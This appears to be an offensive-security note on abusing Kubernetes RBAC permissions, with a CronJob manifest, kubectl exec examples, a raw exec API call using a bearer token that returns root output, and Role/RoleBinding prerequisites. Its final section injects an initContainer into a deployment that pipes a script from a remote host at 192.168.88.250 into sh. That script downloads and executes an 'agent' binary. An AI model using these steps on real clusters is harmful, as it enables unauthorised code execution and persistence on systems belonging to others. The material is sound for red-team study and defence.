# RBAC abuse

## cronJob

### Execution

```yaml
apiVersion: batch/v1
kind: CronJob
metadata:
  name: anacronda
spec:
  schedule: "* * * * *" # This means run every 60 seconds
  jobTemplate:
    spec:
      template:
        spec:
          containers:
          - name: anacronda 
            image: busybox:1.28
            imagePullPolicy: IfNotPresent
            command:
            - /bin/sh
            - -c
            - date; echo hello
          restartPolicy: OnFailure
```

## exec into pod

### Execution

```bash
# execute command inside the pod’s first container
kubectl exec $POD_NAME -- $COMMAND

# copy file into the pod (uses exec under the hood)
kubectl cp $LOCAL_PATH $POD_NAME:$REMOTE_PATH

curl -k -H "Authorization: Bearer $TOKEN" -H "Sec-WebSocket-Protocol: v5.channel.k8s.io" "wss://kubernetes.default.svc.cluster.local/api/v1/namespaces/test/pods/nginx-demo-98d9dcdf8-vg2t2/exec?command=id&stdout=true"
# uid=0(root) gid=0(root) groups=0(root)
# {"metadata":{},"status":"Success"}
```

When Exec-ing into a pod, you will by default exec into the first container listed in the pod manifest. If there are multiple containers in a pod you can list them using `kubectl get pods <pod_name> -o jsonpath='{.spec.containers[*].name}'` which will output the names of each container. Once you have the name of a container you can target it using kubectl with the -c flag: `kubectl exec -it <pod_name> -c <container_name> -- sh`

### Prerequisites

```yaml
apiVersion: v1
kind: ServiceAccount
metadata:
  name: pod-execer
  namespace: test
---
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  namespace: test
  name: pod-exec
rules:
  - apiGroups: [""]
    resources: ["pods"]
    verbs: ["get"]
  - apiGroups: [""]
    resources: ["pods/exec"]
    verbs: ["get","create"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  namespace: test
  name: pod-execer-binding
subjects:
  - kind: ServiceAccount
    name: pod-execer
    namespace: test
roleRef:
  kind: Role
  name: pod-exec
  apiGroup: rbac.authorization.k8s.io
```

## sidecar container injection

```sh
# agent.sh

BINARY_URL="http://192.168.88.250:9595/agent.elf"
TARGET_PATH="/tmp/agent"

curl -L -f -o "$TARGET_PATH" "$BINARY_URL"
chmod +x "$TARGET_PATH"
exec "$TARGET_PATH"
```

```bash
kubectl patch deploy nginx-demo -n test --type='strategic' --patch '
spec:
  template:
    spec:
      initContainers:
      - name: setup-script
        image: curlimages/curl
        command: ["/bin/sh", "-c"]
        args: ["curl -s http://192.168.88.250:9595/agent.sh | sh"]
'
```
